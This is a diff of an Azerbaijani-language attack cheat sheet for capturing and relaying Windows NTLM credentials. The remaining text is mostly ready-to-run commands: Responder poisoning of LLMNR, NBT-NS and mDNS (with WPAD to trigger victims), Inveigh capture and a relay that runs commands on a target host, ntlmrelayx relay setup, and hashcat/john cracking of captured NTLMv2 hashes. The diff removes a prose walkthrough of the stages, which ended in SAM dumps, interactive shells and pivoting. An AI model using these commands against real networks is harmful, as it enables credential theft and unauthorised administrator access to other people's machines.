@@ -33,8 +33,8 @@ CMD: net stop lanmanserver && net start lanmanserver
 
 ```
 
-## Exploitation
-```
+## Responder
+```powershell
 Target Triggering:
 \\<RESPONDER-IP>\Shared
 Triggering: Qurbanın özünün səhv yazmasını gözləmək istəmirsənsə, WPAD (Web Proxy Auto-Discovery) hücumunu da Responder-də aktiv saxla (-w parametri ilə). Bu, brauzer açılan kimi avtomatik sorğu yarada bilər.
@@ -42,16 +42,19 @@ Triggering: Qurbanın özünün səhv yazmasını gözləmək istəmirsənsə, W
 ## Responder 
 sudo responder -I eth0 -rdwv -F
 tail -f /usr/share/responder/logs/SMB-NTLMv2-*.txt
+```
 
 ## Inveigh
+```powershell
 Import-Module .\Inveigh.ps1
 Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y
 Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y -FileUpload L -IP <SPECIAL-IP> -Unique
 
 Invoke-InveighRelay -Target 172.16.0.50 -Command "whoami /all" -ConsoleOutput Y
-
+```
 
 ## NTLMRELAYX
+```powershell
 Terminal 1: 192.168.1.40 dan gələn NTLM Hash ilə 192.168.1.50 hostuna NTLM Relay edir ( Self-Relay mümkün deyil )
 /etc/responder/Responder.conf --> SMB = Off / HTTP = Off
 
@@ -80,51 +83,8 @@ hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
 john --wordlist=rockyou.txt --format=netntlmv2 captured.hash
 ```
 
-# Explain this Process
-## Mərhələ 1: Şəbəkədə Dinləmə və Zəhərləmə (Poisoning)
-```
-Hücumun başlanğıc nöqtəsi qurbanın şəbəkədə yolunu azmasını gözləməkdir.
 
-Alət: Responder
 
-Nə baş verir: Sən şəbəkədə LLMNR, NBT-NS və MDNS protokollarını dinləyirsən. Qurban mövcud olmayan bir şəbəkə qovluğuna (məsələn: \\fayl-server1) müraciət etdikdə, Responder ona "Həmin server mənəm!" cavabını verir.
 
-Nəticə: Qurban sənə güvənir və sənin qurduğun saxta SMB/HTTP serverinə autentifikasiya sorğusu (Hash) göndərir.
-```
-
-## Mərhələ 2: Analiz və Enumeration
-```
-Hər şeyi kor-koranə etməmək üçün şəbəkənin təhlükəsizlik vəziyyətini yoxlayırsan.
-
-Alət: CrackMapExec (CME) və ya Nmap
-
-Nə baş verir: Sən subnet-dəki maşınlarda SMB Signing statusunu yoxlayırsan.
-
-Nəticə: Öyrənirsən ki, relay hücumu üçün sənə Signing: False olan maşınlar lazımdır. Əgər hamısında True-dursa, ya bu müdafiəni laboratoriyada söndürməli, ya da "Cross-protocol relay" (SMB to LDAP) sınaqdan keçirməlisən.
-```
-
-## Mərhələ 3: Relay (Ötürmə) Hücumu
-```
-Bu mərhələdə sən sadəcə bir "poçtalyon" rolunu oynayırsan.
-
-Alət: impacket-ntlmrelayx
-
-Nə baş verir: 1. Responder-də SMB və HTTP serverlərini bağlayırsan ki, portlar boşalsın.
-2. ntlmrelayx-i işə salıb hədəf IP-ni göstərirsən.
-3. Qurban sənə (Responder-ə) hash göndərdiyi an, ntlmrelayx həmin hash-i tutub dərhal hədəf maşına ötürür.
-
-Kritik Qayda: Self-relay işləmir. Hash-i gəldiyi maşına geri göndərə bilməzsən, mütləq başqa bir hədəf seçməlisən.
-
-Mərhələ 4: Post-Exploitation (Sızma Sonrası)
-Əgər relay uğurlu olsa (SUCCEEDED), artıq hədəf maşında Administrator hüquqları ilə hərəkət edirsən.
-
-Nə baş verir:
-
-SAM Dump: Hədəf maşındakı bütün lokal istifadəçilərin hash-lərini çəkirsən.
-
-Interactive Shell: Maşına daxil olub komandalar icra edirsən.
-
-SOCKS Proxy: Hədəf maşını bir tramplin kimi istifadə edərək şəbəkənin daha dərinliklərinə sızırsan.
-```
 
 
